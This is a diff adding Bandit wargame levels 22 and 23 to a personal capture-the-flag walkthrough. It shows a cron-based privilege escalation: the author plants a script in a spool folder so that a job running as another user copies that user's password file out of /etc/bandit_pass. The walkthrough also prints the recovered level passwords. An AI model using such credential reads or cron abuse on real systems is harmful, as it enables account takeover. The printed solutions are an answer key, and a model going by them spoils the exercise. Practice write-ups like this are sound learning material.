@@ -932,3 +932,74 @@ echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
 
 cat /etc/bandit_pass/$myname > /tmp/$mytarget
 ```
+The script seems to get the current user (for the case of this level: bandit22) and then gets the hash for the string: "I am user $myname ". The password file for that user then gets copied into a tmp file with the name of the md5 hash of said string.
+
+```bash
+bandit22@bandit:~$ whoami
+bandit22
+bandit22@bandit:~$ echo I am user bandit23 | md5sum
+8ca319486bfbbc3663ea0fbe81326349  -
+bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
+```
+But we ofcourse need the get the password of the user bandit23 and not bandit22. So we use the same logic in the script and get the correct password.
+
+# Level 23
+
+A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
+
+NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
+
+NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
+
+Commands you may need to solve this level
+chmod, cron, crontab, crontab(5) (use “man 5 crontab” to access this)
+
+You know the drill.
+
+```bash
+bandit23@bandit:~$ ls /etc/cron.d/
+clean_tmp  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  e2scrub_all  otw-tmp-dir  sysstat
+bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname/foo
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+```
+This script runs all the files in the the folder: "/var/spool/bandit23/foo" as long as the owner of the script is: "bandit23". So lets create a simple bash script that will get the password file of the user bandit24.
+
+The script I made:
+```bash
+#!/bin/bash
+
+cat /etc/bandit_pass/bandit24 > /tmp/12345.txt
+```
+After much struggle with the output folder (dumb me didn't realise that the /home/bandit23 folder was not writable to) I got the script to work.
+
+```bash
+bandit23@bandit:~$ nano /var/spool/bandit24/foo/bash.sh
+bandit23@bandit:~$ chmod +x /var/spool/bandit24/foo/bash.sh
+bandit23@bandit:~$ ls -l /var/spool/bandit24/foo/bash.sh
+-rwxrwxr-x 1 bandit23 bandit23 60 Jun 10 02:25 /var/spool/bandit24/foo/bash.sh
+bandit23@bandit:~$ cat /tmp/12345.txt
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+```
+
+# Level 24
